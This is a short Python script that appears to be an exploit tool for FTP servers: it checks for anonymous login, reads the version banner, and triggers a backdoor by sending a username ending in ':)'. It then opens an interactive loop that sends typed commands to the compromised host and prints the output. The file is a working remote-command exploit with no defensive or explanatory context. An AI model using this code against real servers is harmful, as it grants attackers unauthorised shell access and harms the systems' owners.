import ftplib
import socket
import re

BUFFER_SIZE = 4096


def anonymous_login_check(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        response = ftp.login("anonymous")
        if response == "230 Login successful.":
            print("[*] Anonymous login is permitted.")
        else:
            print("[*] Anonymous login is not permitted.")
        ftp.quit()
    except Exception as exception:
        print("[*] " + str(exception))
        print("[*] Anonymous login check failed.")


def extract_version_with_regex(banner):
    pattern = r"\((.*?)\)"
    match = re.search(pattern, banner)
    if match:
        version = match.group(1)
        return version
    else:
        return None


def check_ftp_version(hostname):
    ftp = ftplib.FTP(hostname)
    print("[*] Checking ftp service and version...")
    banner = ftp.getwelcome()
    banner = extract_version_with_regex(banner)
    print(f"[*] Ftp Service: {banner}") if banner else print(
        "[*] Ftp service couldn't be detected.")
    return banner


def ftp_backdoor_trigger(hostname, port):
    try:
        print("[*] Starting the backdoor trigger...")
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((hostname, port))
        client.settimeout(5)
        print("[*] Connected to the server for backdoor trigger...")

        print("[*] Malicious username credential is being sent...")
        client.send("USER user:)\n".encode())
        client.send("PASS pass\n".encode())
        print("[*] Backdoor trigger finished.")
    except socket.timeout:
        print("[*] Socket timed out.")
        print("[*] Backdoor trigger failed.")
    except Exception as exception:
        print("[*] " + str(exception))
        print("[*] Backdoor trigger failed.")
    finally:
        client.close()


def ftp_backdoor_exploit(hostname, port):
    try:
        print("[*] Starting the backdoor exploit...")
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((hostname, port))
        client.settimeout(5)
        print("[*] Backdoor exploit is successful.")

        while True:
            command = input("Enter command ('exit' to quit): ")
            client.send(command.encode() + b"\n")
            if command.lower() == 'exit':
                break
            data = client.recv(BUFFER_SIZE)
            print(data.decode())
    except socket.timeout:
        print("Socket timed out.")
    except Exception as exception:
        print("[*] " + str(exception))
        print("Terminating the program.")
    finally:
        client.close()
